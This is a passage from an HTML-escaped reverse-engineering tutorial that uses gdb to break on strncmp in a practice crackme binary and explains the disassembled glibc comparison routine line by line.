&lt;span style=&#34;color: #268BD2&#34;&gt;Reading&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;symbols&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;root&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;Desktop&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;kek&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;crkme1...done.&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;gdb&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;break&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;strncmp&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;Breakpoint&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;at&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x8048350&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;gdb&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;r&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;bzz&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;Starting&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;program&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;root&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;Desktop&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;kek&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;crkme1&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;bzz&lt;/span&gt;

&lt;span style=&#34;color: #268BD2&#34;&gt;Breakpoint&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;__strncmp_ssse3&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;()&lt;/span&gt;
    &lt;span style=&#34;color: #268BD2&#34;&gt;at&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;..&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;sysdeps&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;i386&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;i686&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;multiarch&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;strcmp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ss&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;se3.S&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;65&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;65&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;..&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;sysdeps&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;i386&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;i686&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;multiarch&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;strcmp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ss&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;se3.S&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;No&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;such&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;file&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;or&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;di&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;rectory.&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;gdb&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;di&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;sass&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;Dump&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;assembler&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;code&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;__strncmp_ssse3&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7f82b80&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;   &lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7f82b81&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;edx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;DWORD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;PTR&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x8&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7f82b85&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;DWORD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;PTR&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0xc&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7f82b89&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;9&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;DWORD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;PTR&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x10&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7f82b8d&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;13&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;cmp&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x10&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7f82b90&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;16&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;jb&lt;/span&gt;     &lt;span style=&#34;color: #2AA198&#34;&gt;0xb7f843d0&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;__strncmp_ssse3&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;6224&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Now we can see what happens in strncmp. The following is the cleaned up version of the assembly of strncmp.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;strncmp&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #586E75&#34;&gt;; assuming we called strncmp (argv[1],code,32);&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7f82b80&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;   &lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7f82b81&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt; 	&lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;edx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;DWORD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;PTR&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x8&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;  &lt;span style=&#34;color: #586E75&#34;&gt;; argv[1] or &amp;quot;7bzz&amp;quot;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7f82b85&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt; 	&lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;DWORD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;PTR&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0xc&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;  &lt;span style=&#34;color: #586E75&#34;&gt;; code or &amp;quot;7bc3 ..&amp;quot;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7f82b89&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;9&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt; 	&lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;DWORD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;PTR&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x10&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #586E75&#34;&gt;; 32 or 0x20&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7f82b8d&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;13&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt; 	&lt;span style=&#34;color: #268BD2&#34;&gt;cmp&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x10&lt;/span&gt;                 &lt;span style=&#34;color: #586E75&#34;&gt;; 32 compared to 0x10 (16 decimal)&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7f82b90&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;16&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt; 	&lt;span style=&#34;color: #268BD2&#34;&gt;jb&lt;/span&gt;     &lt;span style=&#34;color: #2AA198&#34;&gt;0xb7f843d0&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;__strncmp_ssse3&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;6224&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;...&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;; if number of bytes to compare is bigger than 16&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;; let&amp;#39;s assume it is not and see what happens next&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;...&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7f843d0&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;6224&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;test&lt;/span&gt;   &lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;  &lt;span style=&#34;color: #586E75&#34;&gt;; if (ebp == 0) goto 0xb7f843c3&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7f843d2&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;6226&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;je&lt;/span&gt;     &lt;span style=&#34;color: #2AA198&#34;&gt;0xb7f843c3&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;__strncmp_ssse3&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;6211&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt; 
&lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7f843d4&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;6228&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;movzx&lt;/span&gt;  &lt;span style=&#34;color: #B58900&#34;&gt;ecx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;BYTE&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;PTR&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #586E75&#34;&gt;; ecx = code&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7f843d7&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;6231&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;cmp&lt;/span&gt;    &lt;span style=&#34;color: #DC322F&#34;&gt;BYTE&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;PTR&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;edx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;cl&lt;/span&gt;  &lt;span style=&#34;color: #586E75&#34;&gt;; if (code[0] != argv[1][0]) goto 0xb7f843b0;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7f843d9&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;6233&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;jne&lt;/span&gt;    &lt;span style=&#34;color: #2AA198&#34;&gt;0xb7f843b0&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;__strncmp_ssse3&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;6192&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7f843db&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;6235&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;test&lt;/span&gt;   &lt;span style=&#34;color: #B58900&#34;&gt;cl&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;cl&lt;/span&gt;  &lt;span style=&#34;color: #586E75&#34;&gt;; if (code[0] == 0) goto 0xb7f843c3; // have we reached the end of code?&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7f843dd&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;6237&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;je&lt;/span&gt;     &lt;span style=&#34;color: #2AA198&#34;&gt;0xb7f843c3&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;__strncmp_ssse3&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;6211&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;
